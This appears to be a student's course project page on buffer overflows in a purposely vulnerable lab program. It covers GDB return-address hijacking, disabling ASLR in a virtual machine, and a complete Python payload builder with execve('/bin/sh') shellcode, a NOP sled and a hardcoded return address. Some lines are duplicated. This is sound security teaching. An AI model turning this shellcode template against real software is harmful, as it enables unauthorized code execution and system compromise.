<!DOCTYPE html>
<html lang="en">

<head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link
                href="https://fonts.googleapis.com/css2?family=Atkinson+Hyperlegible+Mono:ital,wght@0,200..800;1,200..800&family=Atkinson+Hyperlegible+Next:ital,wght@0,200..800;1,200..800&display=swap"
                rel="stylesheet">
        <link rel="stylesheet" href="/common.css">
        <link rel="stylesheet" href="/content/cs465-projects/styles.css">
        <title>Buffer Overflow - text to types</title>
</head>

<body>
        <header>
                <h1 class="title">
                        <a href="/">
                                <span class="logo">&lt;T&gt;</span>
                                <span class="text">text</span>
                                <span class="text">to</span>
                                <span class="text">types</span>
                        </a>
                </h1>
                <nav>
                        <!-- TODO: maybe use a details element to make this collapsible for mobile? -->
                        <ul>
                                <li><a href="/">home</a></li>
                                <li><a href="https://research.texttotypes.com">blog</a></li>
                                <li><a href="/portfolio">portfolio</a></li>
                                <li><a href="/resume">resume</a></li>
                                <li><a href="https://github.com/pixilcode">github</a></li>
                        </ul>
                </nav>
        </header>

        <main>
                <h1>Buffer Overflow</h1>

<p class="summary"><em>This project explores some of the dangers of buffer overflow using a
vulnerable program, <a href="assets/overflow.c">overflow.c</a>, and its
compiled version, <a href="assets/overflow">overflow</a>.</em></p>

<p><em>Note that one buffer-overflow protection normally used in modern operating
systems is Address Space Layout Randomization (ASLR). This permutes the
virtual address mapping of each segment of your program, every time it is run.
To be able to reproduce this project, you will need to run this in a virtual machine
with ASLR disabled. This
will ensure that each time you run overflow, all the addresses will be the same.
To disable ASLR, run the command <code class="inline-code">sudo sysctl kernel.randomize_va_space=0</code>.
<strong>Make sure this is done in a VIRTUAL MACHINE! You do not want to disable this
protection on your own system!</strong></em></p>

<h2>Part A</h2>

<p>In order to get to the vulnerable function with GDB, I first ran the program
with <code class="inline-code">gdb overflow</code>. After that, I performed the following steps:</p>

<ul><li>Set a break point in <code class="inline-code">main</code> with <code class="inline-code">break main</code></li>
<li>Run the program with <code class="inline-code">run</code></li>
<li>Use <code class="inline-code">disassemble vulnerable</code> in order to get the address of the
<code class="inline-code">vulnerable</code> function, <code class="inline-code">0x0000555555555179</code></li>
<li>Get the address of the saved <code class="inline-code">rip</code> (<code class="inline-code">0x7fffffffddd8</code>) with <code class="inline-code">info frame</code></li>
<li>Set the saved <code class="inline-code">rip</code> to the address of <code class="inline-code">vulnerable</code> with
<code class="inline-code">set {void *}0x7fffffffddd8 = 0x0000555555555179</code></li>
<li>Run the rest of the program with <code class="inline-code">continue</code></li></ul>

<p>Interestingly, this correctly jumped to the <code class="inline-code">vulnerable</code> function, but it would
produce a segmentation fault when it ran <code class="inline-code">system(IMPORTANT)</code>. In order to see
if I could find where the problem was, I did the following:</p>

<ul><li>Created a seperate version of the code that called <code class="inline-code">vulnerable</code>. This code
ran as expected and opened up a shell, indicating that the
<code class="inline-code">system(IMPORTANT)</code> works correctly when called normally.</li>

<li>Ran the modified code with GDB, setting break points and stepping through
the code one line at a time. This still worked correctly, indicating that
GDB wasn't interfering with the system call.</li>

<li>Ran the original call up until the <code class="inline-code">system(IMPORTANT)</code> call, then ran the
command <code class="inline-code">call system(IMPORTANT)</code>. This correctly opened up a shell, which
would seem to indicate that there isn't a problem with the stack or
registers, unless I don't understand how the <code class="inline-code">call</code> command works.</li>

<li>Examined the line of code where it segfaults in <code class="inline-code">system.c</code>:

<pre class="code-block c"><code>ret = __posix_spawn (&amp;pid, SHELL_PATH, 0, &amp;spawn_attr,
                 (char *const[]){ (char *) SHELL_NAME, // &lt;-- Error indicated here
                                  (char *) "-c",
                                  (char *) line, NULL },
                 __environ);
                 __environ);</code></pre>

Unfortunately, this didn't give me much information, since I'm not as
familiar with the <code class="inline-code">glibc</code> library.</li></ul>

<p>Finally, I decided to try jumping directly to the setup for the
<code class="inline-code">system(INFORMATION)</code> call at <code class="inline-code">0x000055555555518c</code>, rather than the beginning
of the function. Surprisingly, this worked! I'm not sure why there was a
difference, other than the fact that the setup for the <code class="inline-code">vulnerable</code> function or
<code class="inline-code">puts</code> may have messed with the stack in some way. This would be an interesting
point of further research.</p>

<img alt="A failed attempt at opening a shell" src="images/failed-shell.png"/>

<img alt="A successful attempt at opening a shell" src="images/successful-shell.png"/>


<h2>Part B</h2>

<img alt="Providing input to overflow the buffer and rewrite the return address" src="images/successful-input.png"/>


<h2>Part C</h2>

<p>The following code is <code class="inline-code">makepayload</code> used in running shellcode with</p>

<pre class="code-block bash"><code>./overflow2 `./makepayload 120`
./overflow2 `./makepayload 120`</code></pre>

<pre class="code-block python"><code>#!/usr/bin/env python3
import sys

#machine code to execve("/bin/sh", NULL, NULL)  from https://www.exploit-db.com/exploits/46907
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

#the target address we want to jump to (beginning, approximately, of nameBuffer) in LE format
#YOU NEED TO MAKE THIS BE THE ADDRESS OF nameBuffer, approximately
target = b'\x50\xdd\xff\xff\xff\x7f'

#how many bytes we need to include in our payload to get 'target' written over main's saved $RIP
#YOU HAVE TO FIND THE RIGHT OFFSET HERE
stackspot=int(sys.argv[1])

#how big a noop sled we want
#YOU MIGHT NEED TO TWEAK THIS
sledsize = 16
sled = b'\x90'*sledsize

#some ASCII chars to fill out the buffer
stuff = b'A' * (stackspot - len(shellcode) - len(sled))

#  for this attack, the buffer looks like this:
#  noop-sled || shellcode || stuff || target-written-over-saved-eip

payload = sled + shellcode + stuff + target

# write binary string to stdout raw
sys.stdout.buffer.write(payload)
sys.stdout.buffer.write(payload)</code></pre>

<img alt="Successful shellcode execution" src="images/successful-shellcode.png"/>

        </main>
</body>

</html>